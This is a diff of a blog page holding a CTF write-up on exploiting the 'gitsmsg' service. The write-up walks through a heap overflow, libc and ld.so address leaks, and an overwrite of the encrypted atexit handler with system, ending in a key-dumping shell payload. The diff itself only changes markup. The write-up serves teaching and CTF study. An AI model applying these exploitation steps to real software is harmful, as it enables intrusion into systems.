@@ -25,7 +25,6 @@
                 <nav><ul>
                     <li><a href="http://codearcana.com">Blog</a></li>
                     <li><a href="http://codearcana.com/archives.html">Archives</a></li>
-                    <li ><a href="http://codearcana.com/pages/about.html">About</a></li>
                 </ul></nav>
         </header><!-- /#banner -->
 
@@ -35,7 +34,7 @@
         rel="bookmark" title="Permalink to Ghost in the Shellcode 2014 - <code>gitsmsg</code>">Ghost in the Shellcode 2014 - <code>gitsmsg</code></a></h1> <a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="awreece">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
  </header>
 <footer class="post-info">
-        <abbr class="published" title="2014-01-19T00:00:00">
+        <abbr class="published" title="2014-01-19T00:00:00-08:00">
                 Sun 19 January 2014
         </abbr>
 
@@ -56,10 +55,10 @@ were saved to a linked list and could be edited before being serialized to disk.
 Each message is a tagged union of <code>{byte,dword,double}{_,array}</code>
 or <code>string</code>. A <code>string</code> indexed into an array of static strings.
 A "typical" usage might be:</p>
-<div class="highlight"><pre><span class="c"># After connection, appropriate functions hide the binary protocol.</span>
-<span class="n">login</span><span class="p">(</span><span class="s">&quot;alex&quot;</span><span class="p">)</span>
-<span class="n">newmessage</span><span class="p">(</span><span class="n">to</span><span class="o">=</span><span class="s">&quot;andrew&quot;</span><span class="p">,</span> <span class="n">msg_type</span><span class="o">=</span><span class="n">DWORD_ARRAY</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">17</span><span class="p">)</span>
-<span class="n">newmassage</span><span class="p">(</span><span class="n">to</span><span class="o">=</span><span class="s">&quot;max&quot;</span><span class="p">,</span> <span class="n">msg_type</span><span class="o">=</span><span class="n">STRING</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="c1"># After connection, appropriate functions hide the binary protocol.</span>
+<span class="n">login</span><span class="p">(</span><span class="s2">&quot;alex&quot;</span><span class="p">)</span>
+<span class="n">newmessage</span><span class="p">(</span><span class="n">to</span><span class="o">=</span><span class="s2">&quot;andrew&quot;</span><span class="p">,</span> <span class="n">msg_type</span><span class="o">=</span><span class="n">DWORD_ARRAY</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">17</span><span class="p">)</span>
+<span class="n">newmassage</span><span class="p">(</span><span class="n">to</span><span class="o">=</span><span class="s2">&quot;max&quot;</span><span class="p">,</span> <span class="n">msg_type</span><span class="o">=</span><span class="n">STRING</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
 <span class="n">edit</span><span class="p">(</span><span class="n">msgid</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
 <span class="n">delete</span><span class="p">(</span><span class="n">msgid</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">save</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
@@ -70,7 +69,7 @@ A "typical" usage might be:</p>
 <h2>The vulnerability</h2>
 <p>In short, when initializing one of the message type, the programmer forgot to
 factor the data type width when calculating the message size:</p>
-<div class="highlight"><pre><span class="k">case</span> <span class="n">DOUBLE_ARRAY</span>:
+<div class="highlight"><pre><span></span><span class="k">case</span> <span class="nl">DOUBLE_ARRAY</span><span class="p">:</span>
   <span class="n">size</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
   <span class="n">size</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
   <span class="n">v3</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mh">0x3FF</span><span class="p">;</span>
@@ -83,24 +82,24 @@ factor the data type width when calculating the message size:</p>
 
 
 <p>This eventually gives us a heap overwrite:</p>
-<div class="highlight"><pre><span class="n">result</span> <span class="o">=</span> <span class="n">readAll</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><span class="n">result</span> <span class="o">=</span> <span class="n">readAll</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
 </pre></div>
 
 
 <p>At this point, it seems relatively straightforward. We will allocate 2 messages,
 leaving the heap in this state:</p>
-<div class="highlight"><pre>| message A | data A | message B |
+<div class="highlight"><pre><span></span>| message A | data A | message B |
 </pre></div>
 
 
 <p>We then free the first message:</p>
-<div class="highlight"><pre>| &lt;free&gt; | &lt;free&gt; | message B |
+<div class="highlight"><pre><span></span>| &lt;free&gt; | &lt;free&gt; | message B |
 </pre></div>
 
 
 <p>And allocate a new message of type <code>DOUBLE_ARRAY</code>, allowing us to overwrite and
 modify the second message:</p>
-<div class="highlight"><pre>| message C | data C ... essage B |
+<div class="highlight"><pre><span></span>| message C | data C ... essage B |
 </pre></div>
 
 
@@ -122,7 +121,7 @@ address.</p>
 of <code>libc</code> and compare the address to the symbol in each of the versions to match
 the correct <code>libc</code> version. We can now overwrite <code>free</code> with <code>system</code> and delete
 our message to get a shell!</p>
-<div class="highlight"><pre><span class="n">free_addr</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x4f2c</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="n">free_addr</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x4f2c</span><span class="p">)</span>
 <span class="n">head</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x5160</span>
 <span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="mh">0x781b0</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3d170</span>
@@ -141,7 +140,7 @@ address of <code>system</code> and to overwrite the argument for this handler wi
 we controlled. Unfortunately, this function pointer was encrypted. To decrypt, 
 we computed what the function pointer was supposed to be by leaking an address 
 from <code>ld.so</code> and using the address and the encrypted value to calculate the key.</p>
-<div class="highlight"><pre><span class="n">rtld_global_ro_address</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a0ef8</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="n">rtld_global_ro_address</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a0ef8</span><span class="p">)</span>
 <span class="n">ld_base</span> <span class="o">=</span> <span class="n">rtld_global_ro_address</span> <span class="o">-</span> <span class="mh">0x20ca0</span>
 <span class="n">ld_fini_address</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0xf270</span>
 <span class="n">encrypted_atexit_handler</span> <span class="o">=</span> <span class="n">arbitrary_read</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a21ec</span><span class="p">)</span>
@@ -152,7 +151,7 @@ from <code>ld.so</code> and using the address and the encrypted value to calcula
 <p>We then encrypted our target address with this key, update the function pointer
 to use our new address and updated the argument to point to a buffer we
 controlled</p>
-<div class="highlight"><pre><span class="n">encrypted_system</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="n">encrypted_system</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
 <span class="n">arbitrary_write</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a21ec</span><span class="p">,</span> <span class="n">encrypted_system</span><span class="p">)</span>
 <span class="n">arbitrary_write</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1a21f0</span><span class="p">,</span> <span class="n">obj0</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">)</span>
 </pre></div>
@@ -161,7 +160,7 @@ controlled</p>
 <p>To trigger our exploit, we just sent the disconnect message (which fortunately 
 didn't disconnect the socket). For our final exploit, we used the payload 
 <code>cat key &gt;&amp;4</code> to dump the key to the already open socket.</p>
-<div class="highlight"><pre><span class="gp">$</span> python gitsmsg.py
+<div class="highlight"><pre><span></span><span class="gp">$</span> python gitsmsg.py
 <span class="go">Deleting messages ...</span>
 <span class="go">Performing overflow ...</span>
 <span class="go">Editing ...</span>
@@ -201,36 +200,6 @@ didn't disconnect the socket). For our final exploit, we used the payload
 		<div class="widget">
 		    <h2>Tags</h2>
 		    <ul class="cloud">
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/omnios.html">omnios</a>
-			</li>
-			<li class="tag-2">
-			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
-			</li>
-			<li class="tag-1">
-			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
-			</li>
-			<li class="tag-1">
-			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/gdb.html">gdb</a>
-			</li>
-			<li class="tag-1">
-			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
-			</li>
-			<li class="tag-2">
-			  <a class="tag" href="http://codearcana.com/tag/ctf.html">ctf</a>
-			</li>
 		    </ul>
 		</div>
 
